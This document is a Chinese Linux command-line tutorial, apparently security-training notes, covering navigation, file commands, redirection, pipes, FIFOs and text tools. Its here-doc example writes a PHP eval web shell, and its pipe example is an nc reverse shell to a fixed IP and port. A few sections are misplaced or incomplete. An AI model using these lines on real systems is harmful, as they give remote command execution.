## 认识 Linux 与命令行

Linux 这一术语有时被用来指代一系列开源操作系统，但更准确的做法或许是用该术语来描述一个[内核](https://en.wikipedia.org/wiki/Kernel_(operating_system))，而这些操作系统正是以该内核为基础构建的。Linux内核的主要功能包括管理外围设备、处理与处理器和内存的通信、调度待执行任务、处理中断请求等。

内核、系统工具以及各类软件包共同整合，形成**发行版（distribution，distro）**。所谓发行版，是一套可安装、可自启动，并附带附加软件的完整系统。严格来说，Linux 指的是内核；在日常交流中，人们也常用 Linux 泛指基于该内核的操作系统。它是各类发行版赖以运行的核心。内核负责管理并协调计算机的各类硬件设备，同时提供进程、内存、文件系统等基础能力。单独的内核，就像一台没有车身的发动机。

与基于 Linux 系统的交互方式之一是通过**命令行（command line，CLI）**。命令行是一种基于文本的界面，允许信息查询或代码执行。我们可以通过打开终端开始使用命令行你会获得一个界面：

```bash
┌─[bob@AttackBox]─[~]
└──╼ $
```

这叫做 shell 提示符，不同的Linux发行版有不同的提示样式（也可以自定义提示）。提示符通常包含一下的内容：

- bob@AttackBox：用户名@主机名
- ~：当前工作目录
- $符号或者#符号

Linux 上有几个重要的 shell程序：

- sh：Bourne shell是所有其他shell环境的基础，因为它承担着最重要的任务，比如命令解释或作为脚本语言。
- Bash：也称为Bourne-Again SHell，Bash旨在通过提供更多功能和更好的语法来替代Bourne SHell。Bash 是大多数 Linux发行版的默认登录shell。
- ksh：这是一个叫Korn SHell 的 shell 环境变体，它同样为基础的 sh 和bash 增加了一些功能。例如，ksh 在循环语法处理上比 Bash 更好。
- zsh：Z SHELL 是扩展版的 Bourne SHell，增加了更多改进和功能，也在部分Bash 的基础上构建。

不同的shell环境执行相同的基本任务——运行程序和解释命令，但它们提供了不同的功能，可能更适合各种任务。很多Linux发行版的默认shell是GNU bash shell。

尝试在命令行中输入第一个命令`whoami`：

```bash
┌─[bob@AttackBox]─[~]
└──╼ $whoami
bob
```

该命令输出 当前有效用户名（effective user name），就像在任何网站或者操作系统中一样，登录时你需要提供用户名或其他能证明你身份的材料（身份标识，Identification），该命令的输出结果就是如此。

> [!NOTE]
>
> 在linux中严格区分大小写,如果提示错误,首先检查是否命令输入有错误


## 目录结构

在windwos中，你可以通过打开一个文件管理器窗口(explorer.exe)来浏览磁盘上的文件和文件夹，在 Linux 中，用户登录后默认进入自己的家目录。而任意时刻,在命令行中所在的目录则称为 **当前工作目录（current working directory）**。

### 查看当前工作目录

当前工作目录可以使用 `pwd`（print working directory）命令，来显示：

```bash
$pwd
/home/bob
```

这个目录看起来和windwos上完全不同，当你在windwos中插入一个新的硬盘格式化后为你所用时，你需要为分区指定一个盘符，并使用类似C:\Program Files (x86)\的格式进行目录导航：![两块物理磁盘并进行了相应的格式化和分区](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261102010844404.webp)
### 家目录

在 Linux 上新建用户账户时，每个用户都会拥有专属目录，这个目录称为**家目录（home directory）**。默认情况下，家目录存放在 `/home/` 目录下。可以直接执行 `cd` 或者 `cd ~` 快速切换到家目录。

```bash
┌─[bob@AttackBox]─[/home]
└──╼ $cd

┌─[bob@AttackBox]─[~]
└──╼ $cd ~
```

### Linux目录结构

Linux 只有**一棵统一的目录树**，起点是根目录 `/`。没有 Windows 那种 C 盘、D 盘盘符。 多块硬盘、U 盘这些不同存储设备，都 “挂” 到这棵树里面的某个文件夹上（这个文件夹叫**挂载点**），从用户视角看，全部都在同一个目录结构里。

![挂载其他的分区](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261102014424315.webp)

下表是标准 FHS（Linux 文件系统层次标准），它定义 Linux 文件系统目录结构的标准化规范，规定各级目录的命名、存放内容与访问语义：

| 目录   | 用途                                                         |
| ------ | ------------------------------------------------------------ |
| /      | 虚拟目录树的根目录，是整个文件系统的起点，一般不在根下直接存放业务文件 |
| /bin   | 存放普通用户可用的基础二进制可执行命令（GNU 基础工具，系统救援模式也可使用） |
| /boot  | 引导目录，存放系统内核、initramfs、引导器配置等开机启动相关文件 |
| /dev   | 设备目录，Linux 在这里创建设备节点，用来访问硬件             |
| /etc   | 系统全局配置文件目录                                         |
| /home  | 普通用户家目录的默认存放位置，每个用户独立子目录（可选）     |
| /lib   | 库目录，存放系统程序依赖的共享库、内核模块                   |
| /lib64 | 64 位专用库目录，存放 64 位程序的共享库文件（可选）          |
| /media | 媒介挂载目录，U 盘、光盘这类可移动存储设备的自动挂载点       |
| /mnt   | 临时挂载目录，管理员手动挂载磁盘、文件系统时使用             |
| /opt   | 可选目录，用来存放独立的第三方商业软件包                     |
| /proc  | 虚拟进程文件系统，内核动态生成，存放进程、内核运行信息（断电消失） |
| /root  | root 超级管理员的专属家目录（可选，和普通用户的 /home 分开） |
| /run   | 运行时目录，存放开机后产生的临时运行数据：PID、socket 套接字等，重启清空 |
| /sbin  | 系统管理二进制命令，存放 root 管理员使用的系统工具           |
| /srv   | 服务数据目录，本机部署的网络服务（网站、ftp 等）的数据文件   |
| /sys   | 虚拟文件系统，导出硬件、驱动、内核参数信息，用于硬件管理     |
| /tmp   | 临时文件目录，所有用户都可以读写，系统会定期清理里面的文件   |
| /usr   | 次要层次目录（secondary hierarchy），存放用户程序、文档、库、工具等资源 |
| /var   | 可变数据目录，存放运行中持续变化的数据：日志、缓存、队列、数据库等 |

### cd

要更改工作目录，可以使用`cd`（change directory）命令：

```bash
$cd /etc

$pwd
/etc
```

该命令后跟一个绝对路径或者相对路径，命令执行成功将进入该目录中。

#### 绝对路径

绝对路径(也称完整路径) 总是以正斜线（/）作为开始，后跟目录树的分支，比如存放系统中所有账户信息的文件路径表达：

```bash
/etc/passwd
```

> [!NOTE]
>
> 在linux中，文件不必有后缀名，为区分文件和目录，书写路径时常在目录名末尾加 `/` 以便阅读，但这不是区分文件与目录的强制规则

#### 相对路径

相对路径基于当前工作路径。相对路径不以代表根目录的正斜线（/） 开头，例如下面的目录结构：

```txt
/
└── home
    └── bob 			←当前工作目录
        ├── Documents
        └── Music
```

有两个特殊字符可用于相对路径中：  

1. **单点号（.）**：表示当前目录；
2. **双点号（..）**：表示当前目录的父目录。

可以通过下面两种方式进入/home/bob/Documents/ 目录中,后一种方式省略了单点号:

```bash
$cd ./Documents/

$cd Documents/
```

通过下面两种方式进入 /home/ 目录中:

```bash
$cd ./../
$cd ../
```

有趣的地方,你可以通过下面的方式进入/home或者任何你想去的目录:

```bash
$cd ../../../../../../home

$pwd
/home
```

2. 掌握 cat、less、head、tail 与 file 进行文件内容预览与格式识别
3. 运用通配符（*、?、[]、{}）实现文件与目录的批量匹配

## ls 

要想知道系统中都有哪些文件，可以使用`ls`（list）命令，例如查看当前目录下的文件和目录：

```bash
$ls
Documents  
```

或者指定目录下，你可以在`ls`命令后跟绝对路径或者相对路径,你可以一次指定多个目录：

```bash
$ls /
bin   dev  home        lib    lib64  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib32  media  opt  root  sbin  sys  usr  vmlinuz

$ls ../
bob
```

如果没有安装彩色终端仿真器，可以使用 `ls` 命令的 `-F` 选项来轻松地区分文件和目录。使用-F 选项可以得到如下输出：

```bash
$ls -F /
bin@   dev/  home/        lib@    lib64@  mnt/  proc/  run/   srv/  tmp/  var/
boot/  etc/  initrd.img@  lib32@  media/  opt/  root/  sbin@  sys/  usr/  vmlinuz@ 
```

对比上下的输出，可以看到目录后用跟/ 以明确区分目录和文件，还有一些符号可以参考：

| **符号** | **类型**       | **说明**                                        |
| -------- | -------------- | ----------------------------------------------- |
| /        | **目录**       | 表示这是一个文件夹                              |
| *        | **可执行文件** | 表示该文件具有执行权限                          |
| @        | **软链接**     | 符号链接（Symbolic Link），指向另一个文件或目录 |
| =        | **Socket**     | 套接字，用于进程间通信                          |
| \|       | **管道**       | FIFO（命名管道），用于进程间通信                |

`-R` 是ls命令的另一个选项，称作递归（recursive）选项，可以列出指定目录所包含的子目录中的文件，但是不支持指定层级，一般使用`Tree`命令替代，他有更好的表达样式，并且支持递归层级。

### 隐藏目录/文件

Linux 中，**隐藏文件 / 隐藏目录**的命名规则：文件名以 `.`（点）开头。 默认 `ls` 不会显示它们。 使用 `ls -a` 可以查看全部文件，包含隐藏文件与隐藏目录，如下所示：

```bash
$ls
Documents  

$ls -a
.             .sudo_as_admin_successful 
..             .bash_history  Desktop         
.bashrc        Documents                   .ssh         
    
```

一些常见的隐藏文件夹的作用：

| 名称                      | 作用                                            |
| ------------------------- | ----------------------------------------------- |
| .ssh/                     | SSH 密钥、公钥私钥、known_hosts，远程登录核心   |
| .config                   | 大部分桌面程序的用户配置文件（现代 Linux 主流） |
| bash_history或zsh_history | 终端命令历史                                    |
| .bashrc或.zshrc           | 交互式 shell（打开终端）加载的配置文件          |
| .profile                  | 登录 shell加载的文件                            |

### 文件/目录详情

`ls` 命令的 `-l` 选项会产生长列表格式的输出，提供指定文件或目录下的详细信息： 

```bash
$ls -l
total 12
drwxrwxr-x 1 bob bob 148 Nov  1 02:09 attackbox
```

你可以组合使用多个选项，例如 `ls -lF` 或`ls -l -F` 大部分的命令都支持这种形式。一些发行版预设了 `ll` 作为 `ls -l` 的别名。

在长列表格式输出中，每一行会列出一个文件或目录。以attackbox目录为例：

| 字段         | 含义                                                         |
| :----------- | :----------------------------------------------------------- |
| drwxrwxr-x   | 第一个字符指明文件类型，例如目录（d）、文件（-）、链接文件（l）、字符设备（c）或块设备（b）<br />后跟对于文件/目录的访问权限。 |
| 1            | 文件的硬链接数目。参考随后讨论的关于链接的内容。             |
| bob          | 文件所有者的用户名。                                         |
| bob          | 文件所属用户组的名字。                                       |
| 148          | 以字节数表示的文件大小。                                     |
| Nov  1 02:09 | 上次修改时间和日期。                                         |
| attackbox    | 文件/目录名。                                                |

如果只想查看目录本身的信息，可以使用组合`-d`选项：

```bash
$ls -ld attackbox/
drwxrwxr-x 1 bob bob 148 Nov  1 02:09 attackbox/
```

可以组合使用`-h`选项，让文件大小以人类可读方式呈现：

```bash
$ls -lh attackbox/README.md
-rw-rw-r-- 1 bob bob 41K Nov  1 02:09 attackbox/README.md
```

### 输出排序

`ls`命令的输出，可以通过下面的方式进行排序：

| 参数                 | 排序规则                 | 默认顺序           |
| -------------------- | ------------------------ | ------------------ |
| 默认 | 按文件名排序 | 升序               |
| `-t`                 | 修改时间 mtime           | **新的在前**       |
| `-S`                 | 文件大小                 | **大的在前**       |
| `-X`                 | 按扩展名排序       | 升序               |
| `-r`                 | 反转         | 把上面的排序反过来 |

### 元字符通配符

shell 提供了特殊字符来帮助你快速指定一组文件名。这些特殊字符叫做通配符。 通配符允许你依据字符的组合模式来选择文件名。下表列出这些通配符 以及它们所选择的对象：

| 通配符        | 意义                                                         |
| :------------ | :----------------------------------------------------------- |
| *             | 匹配任意多个字符（包括零个或一个）但不会匹配名字首字符是 . 的文件和目录 |
| ?             | 匹配任意一个字符（不包括零个）                               |
| [characters]  | 匹配任意一个属于 字符集 中的字符                             |
| [!characters] | 匹配任意一个不是 字符集 中的字符                             |
| [[:class:]]   | 匹配任意一个属于指定 字符类 中的字符                         |

**方括号代表单个字符位置并给出了该位置上的多个可能的选择**。你可以将可能的字符逐一列出[a b c]，也可以指定 字符范围，比如字母范围[a–c]，也可以使用字符类，下表列出常见的字符类：

| 字符类    | 意义                   |
| :-------- | :--------------------- |
| [:alnum:] | 匹配任意一个字母或数字 |
| [:alpha:] | 匹配任意一个字母       |
| [:digit:] | 匹配任意一个数字       |
| [:lower:] | 匹配任意一个小写字母   |
| [:upper:] | 匹配任意一个大写字母   |

下面是一些案例，接受文件名作为参数的任何命令，都可以使用通配符：

| 模式                   | 匹配对象                                                  |
| :--------------------- | :-------------------------------------------------------- |
| *                      | 所有文件和文件夹，默认不包括隐藏文件/目录                 |
| g*                     | 文件名以“g”开头的文件                                     |
| b*.txt                 | 以"b"开头，中间有零个或任意多个字符，并以".txt"结尾的文件 |
| Data???                | 以“Data”开头，其后紧接着3个字符的文件                     |
| [abc]*                 | 文件名以"a","b",或"c"开头的文件                           |
| BACKUP.[0-9][0-9][0-9] | 以"BACKUP."开头，并紧接着3个数字的文件                    |
| [[:upper:]]*           | 以大写字母开头的文件                                      |
| [![:digit:]]*          | 不以数字开头的文件                                        |
| *[[:lower:]123]        | 文件名以小写字母结尾，或以 “1”，“2”，或 “3” 结尾的文件    |

## file

在显示文件内容之前，应该先了解文件类型。如果尝试显示二进制文件，那么屏幕上会出 现各种乱码,并导致shell程序无法响应。

`file` 命令能够探测文件的内部并判断文件类型，如下所示 第一个文件为文本文件，第二个文件为可执行文件：


## ln

Linux 文件系统引入了**链接（Link）**机制，用来解决 “同一份数据需要在多处被访问” 的场景。链接机制可以基于同一套磁盘物理数据，提供多个访问入口，实现数据共享。链接分为两类：**硬链接（Hard Link）**和**软链接（符号链接，Symbolic Link）**，二者实现原理、特性完全不同。

硬链接本质是文件的别名，多个文件名指向同一个 inode，对应磁盘上同一组数据块。但硬链接不支持跨文件系统，不能对目录创建硬链接，可以使用 `ln` 命令创建硬链接：

```bash
$ln a.txt link_a.txt

$ll
total 0
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 a.txt
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 link_a.txt
```

符号链接（也称为软链接）是一个实实在在的文件，该文件指向存放在虚拟目录结构中某个 地方的另一个文件。使用`ln`命令以及`-s`选项来 创建符号链接：

```bash
$ln -s a.txt slink_a.txt

$ll
total 4.0K
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 a.txt
lrwxrwxrwx 1 bob bob 5 Nov  2 07:21 slink_a.txt -> a.txt
```

软连接类似于 Windows 的“快捷方式”。它是一个拥有独立 inode 的全新文件，它保存的是目标路径字符串（短链接的路径可能直接保存在 inode 内）。如果这个路径无法再找到目标，链接就会成为空链接。

```
$cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

## head、tail

`head` 命令可用于打印文件的前 N 行。例如，若只想显示文件的前三行，可执行 `head -n 3 file.txt` 命令。在查看配置文件时，若我们只关注文件开头的几行，就可以使用该命令。

`tail` 则正好相反。它会输出文件的最后 N 行。我们经常用 tail 来查看日志文件。其语法与 head 类似，如 `tail -n 3 file.txt`,表示显示文件的最后三行。由于日志文件中最新的事件会写在末尾，tail 能让我们快速了解文件的运行情况。`-f` 选项可以跟踪文件追加内容，文件被删除 / 改名会停止。


## touch、mkdir

`touch` 命令轻松创建空文件，还可用来改变文件的修改时间：

```bash
$touch host.txt

$ll host.txt
-rw-rw-r-- 1 bob bob 0 Nov  2 04:45 host.txt
```

`mkdir`命令用于创建目录，可以一次性创建多个目录，当文件夹存在时，命令会提示错误,`-p`选项最常用,它可以递归的创建多级目录，目录已存在不会报错，上级目录不存在时将自动创建：

```bash
$mkdir dir1 dir2

$ll
total 0
drwxrwxr-x 1 bob bob 0 Nov  2 07:28 dir1
drwxrwxr-x 1 bob bob 0 Nov  2 07:28 dir2
```

## cp

`cp`（copy） 命令可以将文件和目录从文件系统的一个位置复制到另一个位置，最基本的用法需要两个参数，默认情况下，该命令不会主动保留权限、时间、属主属组。当要复制一个文件时，例如：

```bash
$cp a.txt /home/bob/b.txt
```

> [!NOTE]
>
> 同名文件默认会被覆盖，使用-i 选项进行交互式提示。如果目标文件已存在，覆盖前会询问用户是否确认（防止误覆盖）。

当需要复制多个文件到一个目录中时，可以像这样列出，也可是使用通配符，目标目录放命令最后，但该目录必须存在：

```bash
$cp a.txt b.txt ./Documents/
```

当需要递归复制整个目录内的文件和子目录（包括隐藏文件和目录）时，可以使用 `-R` 或者`-r`选项。如果NewDocuments/ 目录不存在,类似复制并修改文件夹名字,例如:

```bash
$cp -R Documents/ newDocuments/
$ls newDocuments/
a.txt  b.txt
```

如果目标目录已经存在,那么Documents/将作为子目录，例如:

```bash
$cp -r Documents/ newDocuments/
$ls newDocuments/
Documents
```

`-u` 选项用于增量更新复制，只有当源文件比目标文件 新，或者目标文件不存在时，才执行复制，`-p` 选项尝试保留源文件的原有属性（包括所有者、权限、时间戳等），但能否完整保留取决于当前用户权限和文件系统。

## mv

`mv`（move） 命令可以将文件和目录移动到另一个位置 或是重新命名：

```bash
$mv dir1/ dir2/
$ls dir2
dir1

```

当源和目标都是目录，且目标目录存在时，源作为目标的子目录；当目标目录不存在时，mv命令的作用为重命名目录。

可以有多个源文件 源目录，最后一个参数为必须存在的目录，例如

```bash
$mv a b c /dir2/
```

> [!NOTE]
>
> mv命令默认覆盖，使用`-i` 选项可以避免此问题

如果不想作为子目录移动，可以使用通配符，第一个参数匹配普通文件/目录，第二个参数匹配以单个点后接非点字符开头的隐藏名称；**它无法覆盖所有合法的隐藏文件名**：

```bash
$mv dir1/* dir1/.[^.]* dir2/
```

> [!NOTE]
>
> 在 Linux 的 Bash 终端中，通配符 * 默认不包含以 . 开头的隐藏文件（如 .env、.gitignore、.ssh 目录等）

或者临时开启 Bash 的 dotglob 选项可以临时让 * 包含隐藏文件：

```bash
$shopt -s dotglob    # 开启：让 * 匹配隐藏文件

$mv dir1/* dir2/

$shopt -u dotglob    # 关闭（可选）：恢复默认行为
```

# 管道与重定向

本章节涵盖以下学习目标：

1. 理解 Linux 三大标准数据流（STDIN、STDOUT、STDERR）及其文件描述符
2. 熟练使用输出重定向（>、>>）与输入重定向（<、<<）管理数据流
3. 掌握错误重定向与流合并（2>&1、&>）技巧
4. 熟练运用管道符（|）串联多个命令构建处理管线
5. 了解命名管道（FIFO）的基本概念与进程间通信方式

在介绍其他命令之前，先学习管道和重定向，这些功能使我们能够组合更多命令。每个在基于 Linux 系统的命令行上运行的程序都会自动关联三个数据流。每个数据流还会被分配一个文件描述符整数值：

- 标准输入 (0,STDIN)：用于向程序提供输入，默认来自键盘。 
- 标准输出 (1,STDOUT)：程序正常执行结果的输出，默认输出到终端。 
- 标准错误 (2,STDERR)：程序错误信息的输出，默认输出到终端。

管道和重定向是引导标准数据流的方式，可以在程序、文件之间转接流；管道可以将前一个程序的标准输出，作为下一个程序的标准输入。

## STDIN、STDERR

假设需要将 cat 命令的结果输出到文件中,而不是直接显示到命令行,可以按照如下的示例:

```bash
$cat /etc/passwd > pwd.txt
```

命令执行后,将看不到任何的输出结果,重定向 **>** 符号将cat命令的标准输出,重定向到一个文件中,通过打开该文件可以验证:

```bash
$cat pwd.txt
root:x:0:0:root:/root:/bin/bash
<省略>
```

如果尝试读取一个不存在的文件,cat命令会报告错误，如果需要将错误信息重定向到文件中，可以将该文件描述符索引值（2）放在重定向符号之前，只重定向错误消息：

```bash
$cat noexist 2> pwd.txt

$cat psd.txt
cat: noexist: No such file or directory
```

但pwd.txt 文件之前保存的内容被清空了，取而代之的只有cat命令的错误信息，这是因为重定向时，目标文件总是从开头被重写，如果需要从文件后面附加，需要使用 **>>** 符号，表示从文件内容末尾开始。

如果需要同时将 标准输入 (0），标准错误 (2）都进行重定向，下面的例子将两个不同的输出重定向到不同文件,并且不覆盖原文件的内容，可以用如下的示例：

```bash
$cat /etc/passwd noexist >> psd.txt 2>> error.txt

$head -n1 psd.txt  error.txt
==> psd.txt <==
root:x:0:0:root:/root:/bin/bash

==> error.txt <==
cat: noexist: No such file or directory
```

如果需要将两者重定向到同一个文件，可以使用 两种方法：

```bash
$cat /etc/passwd noexist > log.txt 2>&1
```

，如果学过编程语言的指针，该命令可以这样理解：

1.  **> log.txt**：cat 命令的标准输出 (1,STDOUT) 指向 log.txt
2.  **2>&1**：复制 当前标准输出 (1,STDOUT) 的指向，并修改 标准错误 (2,STDERR)  的指向

bash还提供了上面命令更加精简的写法：

```bash
$cat /etc/passwd noexist >& log.txt 
```

弄清楚这里的指向关系后，下面的命令是否能理解呢？为什么没有重定向到文件中？

```
$cat /etc/passwd noexist 2>&1 log.txt
```

## STDIN

在使用输入重定向符 **<** 时，Linux会用重定向指定的文件替换标准输入文件描述符。命令就会从文件中读取数据，就好像这些数据是从键盘输入的一样。

> [!NOTE]
>
> 并非所有的命令都支持 从 标准输入中获取参数并执行

一个最常见的例子来自 `cat` 命令，当在命令行中只输入cat命令时，它会从STDIN接收输入。输入一行，cat命令就显示 一行：

```bash
$cat
hello
hello
```

结束输入，按下 Ctrl+D 键，就是向程序发送 **EOF（文件结束标记）**，cat 收到后结束读取、退出。

cat 除了文件名参数，让我们试着重定向标准输入：

```
$cat < redirect.txt
drwxrwxr-x 1 bob bob 0 Nov  2 07:28 dir1
```

### here-doc

**<<** 符号可将多行文本块作为输入传递给命令，直到遇到用户定义的结束符（如 **EOF**）为止，常用于自动化执行需要交互的命令：

```bash
$cat << EOF > sh.php
> <?php
>   @eval($_POST['cmd']);
> ?>
> EOF
```

结束符可以任意，但常用EOF 表示结束，当输入EOF时，将输入的数据作为**标准输入（fd0）**传给cat的命令，之后使用输出重定向到目标文件中。

### Here-String

<<< 符号 将一个**单行字符串**直接作为标准输入传递给命令，比如base64命令（用于Base64编解码）或md5sum （用于计算MD5哈希值），它们不支持直接在参数中传递字符串编码值，但支持从读取标准输入读取，所以可以使用嵌入字符串 传递：

```bash
$base64 -d <<< "cGFzc3dvcmQ="
$md5sum <<< "admin888"
```

## 管道

管道（|）被置于命令之间，用于将一个命令的输出传入另一 个命令中，例如使用 sort 命令对ls命令的输出排序：

```bash
$ls | sort -r
dir3
dir2
dir1
```

shell创建了两个进程来分别执行ls和sort。两个进程都连接到了管道上，这样写入进程（ls）就将其标准输出（文件描述符为1）连接到了管道的写入端，读取进程（sort）就将其标准输入（文件描述符为0）连接到管道的读取端。实际上，这两个进程并不知道管道的存在，它们只是从标准文件描述符中读取数据和写入数据。

![image-20261104231503572](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261104231503572.webp)

当使用管道连接不同的命令时,命令不是逐个运行，所有的命令都在执行，只是当从一个当前为空的管道中读取数据将会被阻塞运行，直到至少有一个字节被写入到管道中为止。如果管道的写入端被关闭了，那么从管道中读取数据的进程在读完管道中剩余的所有数据之后将会看到文件结束。

管道可以串联的命令数量没有限制。可以持续地将命令输出通过管道传给其他命令，例如：

```bash
$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

这是一个复杂的命令，还包括一些没有介绍的内容，不过很好理解，分号;用于在一行中连续的执行命令，nc工具用于网络连接。下面介绍mkfifo命令

### fifo

FIFO与管道类似，它们两者之间最大的差别在于FIFO在文件系统中拥有一个名称，并且其打开方式与打开一个普通文件是一样的。FIFO也有一个写入端和读取端，数据按写入顺序读出，First In First Out，先入先出。FIFO有时候也被称为命名管道。

`mkfifo` 命令可以在文件系统上创建 FIFO（命名管道）特殊文件，并使用`-m` 选项 指定权限：

```bash
$mkfifo f

$ls -Fl
total 0
prw-rw-r-- 1 bob bob 0 Nov  4 10:46 f|
```

一旦FIFO被创建，任何进程都能够打开它，打开一个FIFO以便读取数据将会阻塞直到另一个进程打开FIFO以写入数据为止。相应地，打开一个FIFO以写入数据将会阻塞直到另一个进程打开FIFO以读取数据为止。

## vim

vim编辑器在内存缓冲区中处理数据。只要输入vim 命令和要编辑的文件名就可以启动vim编辑器。在启动vim时没有指定文件名，或者指定文件不存在，则vim会开辟一段新的缓冲区进行 编辑。如果指定存在的文件，则vim会将该文件的整个内容都读入缓冲区以备编辑。如下中打开sshd服务端配置文件/etc/ssh/sshd_config：

```
vim /etc/ssh/sshd_config
```

vim 编辑器会检测会话的终端类型，使用全屏模式来将整个控制台窗口作为 编辑器区域。vim编辑器有3种操作模式：

1. 命令模式（Normal 模式 / 普通模式）：打开 vim 默认进入这个模式。 不能直接打字输入内容；可以执行光标移动、复制、删除、撤销、跳转等命令。
2. 插入模式（Insert 模式）：可以直接敲键盘输入文本、编辑内容。
3. Ex 模式（命令行模式）：在界面底部出现冒号 : ，输入命令执行保存、退出、查找替换、设置参数等。

按下 i 键就可以进入插入模式,这时可以编辑你的文件。要退出插入模式,按下Esc键即可返回命令模式。 要进入Ex模式，在命令模式中按下冒号键（:）即可。光 标会移动到屏幕底部的消息行处，然后出现冒号，等待输入命令。

在普通模式中，可用的常见命令如下表所示：

| 命令 | 描述                                     |
| ---- | ---------------------------------------- |
| i    | 进入插入模式                             |
| A    | 在光标当前所在行结尾追加数据             |
| a    | 在光标当前位置后追加数据                 |
| x    | 删除光标当前所在位置的字符               |

## sort

`sort` 命令会依据会话所指定的默认语言的排序规则来对每行数据 进行排序，默认 ASCII 字典序、升序，不修改原文件，排序结果输出到 stdout，常配合管道使用，例如：

```bash
$cat <<EOF | sort
> 10
> 2
> aa
> b
> ab
> EOF
10
2
aa
ab
b

```

在对数字进行排序时，为避免和上面命令输出一样，升序的情况下 10>2。需要使用 `-n` 选项，例如：

```bash
 $cat <<EOF | sort -n
> 10
> 2
> a
> a1
> a2
> EOF
a
a1
a2
2
10
```

如果需要对按字段分隔的数据，根据不同的字段进行排序，先使用`-t` 选项指定字段分隔符，然后使用`-k` 选项指定第几个字段。

例如下面的命令，每一行数据使用冒号（：）进行分割，所以指定 -t ‘:' ,然后`-k 3`按照第3个字段来排序：

```bash
$ sort -t ':' -k 3 -n /etc/passwd
root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin 
```

`sort`命令还可以在排序之后进行去重，只需要指定 `-u` 选项，如下所示：

```bash
 $cat <<EOF | sort -u
> a
> b
> a
> EOF
a
b
```

还有一些常用的命令选项：

| 短选项 | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| -r     | 反转，降序。常和 -n 组合                                     |
| -f     | 忽略大小写排序                                               |
| -o     | 输出到文件                                                   |
| -s     | 稳定排序：如果两行排序 key 相同，保留原始先后顺序。多字段排序很有用 |
| -b     | 忽略行开头空格                                               |
| -m     | 合并已经排好序的文件，不会重新全量排序                       |

## uniq

uniq命令经常和 sort 命令结合在一起使用。uniq 从标准输入或单个文件名参数接受数据有序 列表，默认情况下，从数据列表中删除**相邻的**重复行，例如如下的示例：

```bash
$cat <<EOF | sort | uniq
> a
> c
> a
> d
> EOF
a
c
d
```

一些常用的选项如下表所示：

| 短选项 | 描述                                         |
| ------ | -------------------------------------------- |
| `-c`   | 在每行前面输出重复次数                       |
| `-d`   | 只输出有重复的行（只打印重复项）             |
| `-D`   | 输出全部重复的行（重复行全部打印，不止一条） |
| `-u`   | 只输出**只出现一次**的行                     |
| `-i`   | 忽略大小写比较                               |
| `-w N` | 只比较前 N 个字符                            |
| `-s N` | 跳过前面 N 个字符再对比                      |

## wc

`wc`（word count）命令是用来显示文件所包含的行数、字数和字节数。例如：

```
$wc /etc/passwd
  50   83 2837 /etc/passwd
```

wc 打印出来三个数字，依次为行数，单词数和字节数。如果只想知道行数，可以使用 `-l` 选项

## cut

`cut`命令用来从文本中抽取字段，它接受 多个文件参数 或者 标准输入作为源，例如：

```
$cut -d':' -f1,3 /etc/passwd
root:0
```

-d 选项用于指定分隔符，-f 选项用于表示要选取第1列和第3列。也可以选取第1~3列，或者从某列开始到结束：

```bash
# 第1、3列
cut -d' ' -f1,3 /etc/passwd
# 1～3 列
cut -d' ' -f1-3 /etc/passwd
# 从第2列到末尾
cut -d' ' -f2- /etc/passwd
```

常用的选项如下：

| 短选项       | 说明                             |
| ------------ | -------------------------------- |
| -d           | 指定分隔符（默认是 TAB）         |
| -f           | 选取哪些字段（列）               |
| -c           | 按字符位置截取                   |
| -b           | 按字节截取                       |
| --complement | 取反：除了你选的字段，其他都输出 |
| -s           | 只输出包含分隔符的行             |

## tr

`tr` 命令用于字符转换、删除、压缩重复字符，只操作单个字符不按行 / 字段匹配；读取标准输入，不直接接文件名，常配合管道使用。命令接受两个参数：要被转换的字符集以及 相对应的转换后的字符集。字符集可以用三种方式来表示：

1. 一个枚举列表。例如， ABCDEFGHIJKLMNOPQRSTUVWXYZ
2. 一个字符域。例如，A-Z ，1-9。
3. POSIX 字符类。例如，[:upper:]

大多数情况下，两个字符集应该长度相同。常见的用法例如大小写转换：

```bash
# 小写 → 大写
$echo "root Admin Test" | tr 'a-z' 'A-Z'

# 大写 → 小写
$echo "ROOT ADMIN" | tr 'A-Z' 'a-z'
```

`echo`命令 接收字符串参数，把内容打印到标准输出（stdout）；它本身不读取文件，只处理你传给它的参数。

可以利用 `tr`命令简单的实现凯撒密码 （ROT13）加解密，如下所示：

```bash
# 加密
$echo "hello WORLD" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
uryyb JBEYQ

# 解密
$echo "uryyb JBEYQ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
hello WORLD
```

压缩连续重复字符：

```bash
$echo "1.1.1.1   root" | tr -s ' '
1.1.1.1 root
```

删掉指定的字符：

```
$echo "user:x:1000:1000" | tr -d ':'
userx10001000
```

只保留指定字符:

```bash
$echo "from 1.2.3.4 abc" | tr -cd '0-9.'
1.2.3.4
```

常见的选项如下所示：

| 短选项 | 作用                             |
| ------ | -------------------------------- |
| -c     | 取反：对不在第一集合里的字符操作 |
| -d     | 删除指定字符（最常用之一）       |
| -s     | 压缩连续重复字符为单个           |

## grep

 grep 会在文本文件中搜索指定的正则表达式，并将所有包含匹配项的行输出到标准输出（通常是终端屏幕）。了解一点正则表达式（regex）的工作原理会很有帮助。正则表达式是一种用于描述搜索模式的特殊文本字符串。网上有许多优质资源可以详细讲解[正则表达式](http://www.rexegg.com/)。

例如在etc/passwd中检索关于root账户的信息：

```bash
$grep 'root' /etc/passwd
root:x:0:0:root:/root:/bin/bash
nm-openvpn:x:112:113:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
```

因为有多个行 匹配到root，所以他输出了所有的匹配到的行，如果只匹配以root 起始的行，可以配合使用正则表达式，如下面的示例：

```bash
$grep -E '^root' /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

还有一些常见的选项：

| 短选项 | 作用                             |
